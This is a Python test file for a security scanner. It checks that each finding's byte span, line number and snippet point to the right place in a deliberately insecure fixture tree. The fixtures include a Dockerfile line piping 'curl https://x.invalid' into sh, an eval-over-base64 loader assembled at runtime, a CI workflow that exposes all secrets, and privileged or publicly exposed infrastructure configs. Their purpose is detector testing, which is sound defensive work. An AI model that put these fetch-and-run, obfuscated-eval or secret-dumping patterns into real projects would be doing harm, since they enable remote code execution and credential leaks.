"""A finding points where it says it points, in every detector that can.

The reason this is a test and not a review: a line number that is close is
indistinguishable from one that is right until somebody follows it. The
infrastructure detector added `Block.start` to an offset that was relative to
`Block.body`, so every `forbid` finding in Terraform and Bicep was out by the
length of its own header -- `publicNetworkAccess: 'Enabled'` on line 20,
reported on line 15 -- and every test in the suite passed the whole time,
because nothing compared the two.

Written as one property over a tree that exercises many detectors at once,
rather than a case per rule. What it asserts is cheap and total: if a finding
carries a span, the span is inside the file, the bytes at it are the text the
finding shows, and `location.line` is the line those bytes are on.
"""

from __future__ import annotations

import base64
import json
import random

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config
from support import assemble


def _blob(size: int, seed: int) -> str:
    rng = random.Random(seed)  # noqa: S311 -- a fixture, not key material
    return base64.b64encode(bytes(rng.randrange(256) for _ in range(size))).decode()


#: One tree, deliberately broad. Each entry is there to wake a different
#: detector: the point is coverage of the location path, not of the rules.
TREE: dict[str, str] = {
    # The eval is assembled at call time: written out it is the thing it
    # describes, and this repository is scanned by the tool it tests. A
    # reverse shell lived here too and was removed rather than disguised --
    # the capability detector is already awake through this file, and the
    # corpus is where a payload belongs.
    "src/loader.js": (
        "// util\nfunction f() {}\n\n"
        f"const p = '{_blob(600, 11)}';\n\n"
        "function boot() {\n  " + assemble("ev", "al(at", "ob(p));") + "\n}\n\n"
        "module.exports = { boot };\n"
    ),
    "main.tf": (
        'resource "aws_db_instance" "with_a_long_name" {\n'
        '  identifier = "prod"\n  publicly_accessible = true\n}\n'
    ),
    "nsg.bicep": (
        "resource n 'Microsoft.Network/networkSecurityGroups@2023-05-01' = {\n"
        "  name: 'example'\n  properties: {\n    securityRules: [\n      {\n"
        "        access: 'Allow'\n        direction: 'Inbound'\n"
        "        destinationPortRange: '22'\n        sourceAddressPrefix: '*'\n"
        "      }\n    ]\n  }\n}\n"
    ),
    "pod.yaml": (
        "apiVersion: v1\nkind: Pod\nmetadata:\n  name: app\nspec:\n"
        "  hostNetwork: true\n  containers:\n    - name: app\n"
        "      securityContext:\n        privileged: true\n"
    ),
    "template.yaml": (
        "Resources:\n  Database:\n    Type: AWS::RDS::DBInstance\n"
        "    Properties:\n      DBInstanceClass: db.t3.micro\n"
        "      PubliclyAccessible: true\n"
    ),
    "docker-compose.yml": (
        "services:\n  ci:\n    image: runner:1.2\n    privileged: true\n    network_mode: host\n"
    ),
    "Dockerfile": "FROM ubuntu:22.04\nUSER root\nRUN curl https://x.invalid | sh\n",
    ".github/workflows/ci.yml": (
        "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/checkout@v4\n      - run: env\n        env:\n"
        "          ALL: ${{ toJSON(secrets) }}\n"
    ),
    "requirements.txt": "requests==2.19.1\ndjango==1.11.0\n",
    # Assembled at call time: this repository is scanned by the tool it tests.
    ".env": "DEBUG=1\nAPI_TOKEN=" + assemble("kR9mT2nQ8vL4xW7y", "Z3bC6dF1gH5jK8mN") + "\n",
    "package-lock.json": json.dumps(
        {
            "name": "x",
            "lockfileVersion": 2,
            "packages": {
                "node_modules/lodash": {
                    "version": "4.17.4",
                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.4.tgz",
                }
            },
        },
        indent=2,
    )
    + "\n",
}


@pytest.fixture(scope="module")
def located(tmp_path_factory):
    """Every finding from the tree that carries a span, with its file."""
    root = tmp_path_factory.mktemp("locations")
    for relative, body in TREE.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body, encoding="utf-8")
    result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
    return root, [f for f in result.findings if f.evidence.span is not None]


def test_the_tree_wakes_several_detectors(located) -> None:
    """Guards everything below from passing because nothing was found."""
    _, findings = located
    assert len({f.detector for f in findings}) >= 4, (
        f"only {sorted({f.detector for f in findings})} produced a located finding"
    )


def test_every_span_is_inside_its_file(located) -> None:
    root, findings = located
    for finding in findings:
        raw = (root / finding.location.path).read_bytes()
        start, end = finding.evidence.span
        assert 0 <= start <= end <= len(raw), (
            f"{finding.rule_id}: span {finding.evidence.span} is outside "
            f"0..{len(raw)} in {finding.location.path}"
        )


def test_every_line_is_the_line_the_span_is_on(located) -> None:
    """The one the infrastructure detector got wrong for two whole formats."""
    root, findings = located
    for finding in findings:
        raw = (root / finding.location.path).read_bytes()
        start = finding.evidence.span[0]
        assert finding.location.line == raw[:start].count(b"\n") + 1, (
            f"{finding.rule_id} in {finding.location.path}: reported line "
            f"{finding.location.line}, span sits on line "
            f"{raw[:start].count(chr(10).encode()) + 1}"
        )


def test_the_snippet_comes_from_the_span(located) -> None:
    """A snippet may widen to its line for context, and may not be a different line.

    Widening is deliberate -- `RUN curl ... | sh` reads better than the `curl`
    alone -- so this asserts containment rather than equality, which is the
    strongest thing true of both.
    """
    root, findings = located
    for finding in findings:
        snippet = (finding.evidence.snippet or "").strip()
        if not snippet or "[redacted]" in snippet:
            continue
        raw = (root / finding.location.path).read_bytes()
        start, end = finding.evidence.span
        matched = raw[start:end].decode("utf-8", "replace").strip()
        assert matched in snippet or snippet in matched, (
            f"{finding.rule_id}: the span holds {matched[:60]!r} but the "
            f"finding shows {snippet[:60]!r}"
        )
